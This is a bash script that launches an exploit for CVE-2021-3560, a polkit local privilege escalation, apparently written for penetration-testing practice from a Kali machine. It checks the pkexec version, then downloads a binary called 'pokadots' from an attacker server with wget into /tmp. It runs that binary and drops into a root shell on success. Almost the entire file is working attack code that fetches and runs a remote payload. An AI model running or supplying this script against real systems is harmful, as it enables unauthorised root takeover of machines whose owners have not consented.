#!/bin/bash

# -----------------------------------------------------------------
# CVE-2021-3560 — Polkit Local Privilege Escalation (pokadots)
# Exploit source: https://github.com/swapravo/polkadots
# -----------------------------------------------------------------

KALI_IP=""
KALI_PORT="80"

# Parse args
while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            KALI_IP="$2"
            shift 2
            ;;
        --port)
            KALI_PORT="$2"
            shift 2
            ;;
        *)
            echo "[-] Unknown argument: $1"
            exit 1
            ;;
    esac
done

if [ -z "$KALI_IP" ]; then
    echo "Usage: $0 --ip <KALI_IP> [--port <PORT>]"
    exit 1
fi

echo "[*] Using attacker server: $KALI_IP:$KALI_PORT"

# Step 1: Check if pkexec is present
if ! command -v pkexec &>/dev/null; then
    echo "[-] pkexec not found"
    exit 1
fi

VERSION=$(pkexec --version 2>/dev/null | grep -o '[0-9]\+\.[0-9]\+')
echo "[*] Found pkexec version: $VERSION"

# Step 2: Check if version is in vulnerable range (0.113–0.118)
vuln=false
case "$VERSION" in
    0.113|0.114|0.115|0.116|0.117|0.118)
        vuln=true
        ;;
esac

if ! $vuln; then
    echo "[-] pkexec version $VERSION is not vulnerable to CVE-2021-3560"
    exit 2
fi

echo "[+] Vulnerable version detected — proceeding..."

# Step 3: Download exploit
cd /tmp || exit 1
echo "[*] Downloading 'pokadots' exploit..."
wget http://$KALI_IP:$KALI_PORT/pokadots -O pokadots || { echo "[-] Failed to download exploit"; exit 1; }

chmod +x pokadots

# Step 4: Execute exploit
echo "[*] Running exploit..."
./pokadots

# Step 5: Verify
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Exploit succeeded — root shell!"
    /bin/bash
else
    echo "[-] Exploit failed — still $(whoami)"
    exit 1
fi
